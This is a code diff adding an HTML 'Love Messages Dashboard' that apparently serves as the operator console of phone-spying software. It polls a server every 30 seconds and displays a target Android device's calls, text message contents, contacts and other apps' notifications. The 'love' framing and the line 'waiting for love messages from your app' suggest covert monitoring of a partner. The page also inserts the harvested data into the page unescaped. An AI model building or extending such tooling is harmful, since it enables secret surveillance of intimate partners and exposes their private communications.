@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Love Messages Dashboard</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+        
+        .header h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+        }
+        
+        .content {
+            padding: 30px;
+        }
+        
+        .loading {
+            text-align: center;
+            padding: 60px;
+            color: #666;
+            font-size: 1.2em;
+        }
+        
+        .no-data {
+            text-align: center;
+            padding: 60px;
+            color: #666;
+            font-size: 1.2em;
+            background: #f8f9fa;
+            border-radius: 15px;
+            border: 2px dashed #ddd;
+        }
+        
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .stat-card {
+            background: white;
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        
+        .stat-card h3 {
+            color: #667eea;
+            margin-bottom: 10px;
+        }
+        
+        .stat-number {
+            font-size: 2em;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 5px;
+        }
+        
+        .data-section {
+            margin-bottom: 30px;
+        }
+        
+        .section-title {
+            font-size: 1.5em;
+            color: #333;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #667eea;
+        }
+        
+        .data-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 15px;
+        }
+        
+        .data-card {
+            background: white;
+            padding: 15px;
+            border-radius: 10px;
+            box-shadow: 0 3px 10px rgba(0,0,0,0.1);
+        }
+        
+        .data-header {
+            display: flex;
+            justify-content: between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        
+        .data-name {
+            font-weight: bold;
+            color: #333;
+        }
+        
+        .data-time {
+            color: #666;
+            font-size: 0.9em;
+        }
+        
+        .data-details {
+            color: #555;
+            line-height: 1.4;
+        }
+        
+        .refresh-btn {
+            background: #667eea;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-bottom: 20px;
+        }
+        
+        .refresh-btn:hover {
+            background: #5a67d8;
+        }
+        
+        .device-info {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>💕 Love Messages Dashboard</h1>
+            <p>Monitoring love connections</p>
+        </div>
+        
+        <div class="content">
+            <button class="refresh-btn" onclick="loadData()">🔄 Refresh Data</button>
+            
+            <div id="loading" class="loading" style="display: block;">
+                Loading love data...
+            </div>
+            
+            <div id="noData" class="no-data" style="display: none;">
+                <h3>💔 No love data yet</h3>
+                <p>Waiting for love messages from your app...</p>
+                <p>Make sure the app is running and has permissions.</p>
+            </div>
+            
+            <div id="dashboard" style="display: none;">
+                <div id="deviceInfo" class="device-info"></div>
+                
+                <div id="statsGrid" class="stats-grid"></div>
+                
+                <div id="callsSection" class="data-section" style="display: none;">
+                    <h2 class="section-title">📞 Calls</h2>
+                    <div id="callsGrid" class="data-grid"></div>
+                </div>
+                
+                <div id="messagesSection" class="data-section" style="display: none;">
+                    <h2 class="section-title">💬 Messages</h2>
+                    <div id="messagesGrid" class="data-grid"></div>
+                </div>
+                
+                <div id="contactsSection" class="data-section" style="display: none;">
+                    <h2 class="section-title">👥 Contacts</h2>
+                    <div id="contactsGrid" class="data-grid"></div>
+                </div>
+                
+                <div id="notificationsSection" class="data-section" style="display: none;">
+                    <h2 class="section-title">🔔 App Notifications</h2>
+                    <div id="notificationsGrid" class="data-grid"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let latestData = null;
+
+        async function loadData() {
+            try {
+                document.getElementById('loading').style.display = 'block';
+                document.getElementById('dashboard').style.display = 'none';
+                document.getElementById('noData').style.display = 'none';
+                
+                const response = await fetch('/usage_stats/latest');
+                const data = await response.json();
+                
+                console.log('Received data:', data);
+                
+                if (data && data.data) {
+                    latestData = data;
+                    displayDashboard(data);
+                } else {
+                    document.getElementById('noData').style.display = 'block';
+                }
+            } catch (error) {
+                console.error('Error loading data:', error);
+                document.getElementById('noData').style.display = 'block';
+            } finally {
+                document.getElementById('loading').style.display = 'none';
+            }
+        }
+        
+        function displayDashboard(data) {
+            document.getElementById('dashboard').style.display = 'block';
+            
+            // Display device info
+            displayDeviceInfo(data);
+            
+            // Display summary stats
+            displayStats(data.data);
+            
+            // Display data sections
+            if (data.data.calls && Array.isArray(data.data.calls)) {
+                displayCalls(data.data.calls);
+            }
+            
+            if (data.data.messages && Array.isArray(data.data.messages)) {
+                displayMessages(data.data.messages);
+            }
+            
+            if (data.data.contacts && Array.isArray(data.data.contacts)) {
+                displayContacts(data.data.contacts);
+            }
+            
+            if (data.data.notifications && Array.isArray(data.data.notifications)) {
+                displayNotifications(data.data.notifications);
+            }
+        }
+        
+        function displayDeviceInfo(data) {
+            const deviceInfo = document.getElementById('deviceInfo');
+            const device = data.deviceInfo || {};
+            
+            deviceInfo.innerHTML = `
+                <h3>📱 Device Information</h3>
+                <p><strong>Device:</strong> ${data.device || 'Unknown'}</p>
+                <p><strong>Model:</strong> ${device.model || 'Unknown'}</p>
+                <p><strong>Android:</strong> ${device.androidVersion || 'Unknown'}</p>
+                <p><strong>Last Update:</strong> ${new Date(data.timestamp).toLocaleString()}</p>
+                <p><strong>Data Date:</strong> ${data.data.dataDate || 'Today'}</p>
+            `;
+        }
+        
+        function displayStats(loveData) {
+            const statsGrid = document.getElementById('statsGrid');
+            
+            const callsCount = (loveData.calls && Array.isArray(loveData.calls)) ? loveData.calls.length : 0;
+            const messagesCount = (loveData.messages && Array.isArray(loveData.messages)) ? loveData.messages.length : 0;
+            const contactsCount = (loveData.contacts && Array.isArray(loveData.contacts)) ? loveData.contacts.length : 0;
+            const notificationsCount = (loveData.notifications && Array.isArray(loveData.notifications)) ? loveData.notifications.length : 0;
+            
+            statsGrid.innerHTML = `
+                <div class="stat-card">
+                    <h3>📞 Calls Today</h3>
+                    <div class="stat-number">${callsCount}</div>
+                </div>
+                <div class="stat-card">
+                    <h3>💬 Messages Today</h3>
+                    <div class="stat-number">${messagesCount}</div>
+                </div>
+                <div class="stat-card">
+                    <h3>👥 Total Contacts</h3>
+                    <div class="stat-number">${contactsCount}</div>
+                </div>
+                <div class="stat-card">
+                    <h3>� App Notifications</h3>
+                    <div class="stat-number">${notificationsCount}</div>
+                </div>
+            `;
+        }
+        
+        function displayCalls(calls) {
+            const section = document.getElementById('callsSection');
+            const grid = document.getElementById('callsGrid');
+            
+            if (calls.length === 0) {
+                section.style.display = 'none';
+                return;
+            }
+            
+            section.style.display = 'block';
+            grid.innerHTML = '';
+            
+            calls.slice(0, 20).forEach(call => {
+                const card = document.createElement('div');
+                card.className = 'data-card';
+                card.innerHTML = `
+                    <div class="data-header">
+                        <div class="data-name">${call.contactName || call.number || 'Unknown'}</div>
+                        <div class="data-time">${call.timeFormatted || 'N/A'}</div>
+                    </div>
+                    <div class="data-details">
+                        <p><strong>Number:</strong> ${call.number || 'N/A'}</p>
+                        <p><strong>Type:</strong> ${call.type || 'N/A'}</p>
+                        <p><strong>Duration:</strong> ${call.durationFormatted || 'N/A'}</p>
+                    </div>
+                `;
+                grid.appendChild(card);
+            });
+        }
+        
+        function displayMessages(messages) {
+            const section = document.getElementById('messagesSection');
+            const grid = document.getElementById('messagesGrid');
+            
+            if (messages.length === 0) {
+                section.style.display = 'none';
+                return;
+            }
+            
+            section.style.display = 'block';
+            grid.innerHTML = '';
+            
+            messages.slice(0, 20).forEach(message => {
+                const card = document.createElement('div');
+                card.className = 'data-card';
+                card.innerHTML = `
+                    <div class="data-header">
+                        <div class="data-name">${message.contactName || message.address || 'Unknown'}</div>
+                        <div class="data-time">${message.timeFormatted || 'N/A'}</div>
+                    </div>
+                    <div class="data-details">
+                        <p><strong>Type:</strong> ${message.type || 'N/A'}</p>
+                        <p><strong>Message:</strong> ${(message.body || '').substring(0, 100)}${message.body && message.body.length > 100 ? '...' : ''}</p>
+                    </div>
+                `;
+                grid.appendChild(card);
+            });
+        }
+        
+        function displayContacts(contacts) {
+            const section = document.getElementById('contactsSection');
+            const grid = document.getElementById('contactsGrid');
+            
+            if (contacts.length === 0) {
+                section.style.display = 'none';
+                return;
+            }
+            
+            section.style.display = 'block';
+            grid.innerHTML = '';
+            
+            contacts.slice(0, 50).forEach(contact => {
+                const card = document.createElement('div');
+                card.className = 'data-card';
+                card.innerHTML = `
+                    <div class="data-header">
+                        <div class="data-name">${contact.name || 'Unknown'}</div>
+                        <div class="data-time">${contact.type || 'Unknown'}</div>
+                    </div>
+                    <div class="data-details">
+                        <p><strong>Number:</strong> ${contact.number || 'N/A'}</p>
+                    </div>
+                `;
+                grid.appendChild(card);
+            });
+        }
+        
+        function displayNotifications(notifications) {
+            const section = document.getElementById('notificationsSection');
+            const grid = document.getElementById('notificationsGrid');
+            
+            if (notifications.length === 0) {
+                section.style.display = 'none';
+                return;
+            }
+            
+            section.style.display = 'block';
+            grid.innerHTML = '';
+            
+            // Group notifications by app
+            const notificationsByApp = {};
+            notifications.forEach(notification => {
+                const appName = notification.appName || 'Unknown App';
+                if (!notificationsByApp[appName]) {
+                    notificationsByApp[appName] = [];
+                }
+                notificationsByApp[appName].push(notification);
+            });
+            
+            // Display grouped notifications
+            Object.entries(notificationsByApp).forEach(([appName, appNotifications]) => {
+                const card = document.createElement('div');
+                card.className = 'data-card';
+                card.innerHTML = `
+                    <div class="data-header">
+                        <div class="data-name">${appName}</div>
+                        <div class="data-time">${appNotifications.length} notifications</div>
+                    </div>
+                    <div class="data-details">
+                        ${appNotifications.slice(0, 3).map(notif => `
+                            <div style="margin-bottom: 10px; padding: 8px; background: #f5f5f5; border-radius: 5px;">
+                                <p><strong>Time:</strong> ${notif.time || 'N/A'}</p>
+                                <p><strong>Title:</strong> ${notif.title || 'No title'}</p>
+                                <p><strong>Message:</strong> ${(notif.text || '').substring(0, 150)}${notif.text && notif.text.length > 150 ? '...' : ''}</p>
+                                ${notif.sender ? `<p><strong>From:</strong> ${notif.sender}</p>` : ''}
+                                ${notif.conversationTitle ? `<p><strong>Chat:</strong> ${notif.conversationTitle}</p>` : ''}
+                            </div>
+                        `).join('')}
+                        ${appNotifications.length > 3 ? `<p><em>+${appNotifications.length - 3} more notifications...</em></p>` : ''}
+                    </div>
+                `;
+                grid.appendChild(card);
+            });
+        }
+        
+        // Load data when page loads
+        loadData();
+        
+        // Auto refresh every 30 seconds
+        setInterval(loadData, 30000);
+    </script>
+</body>
+</html>
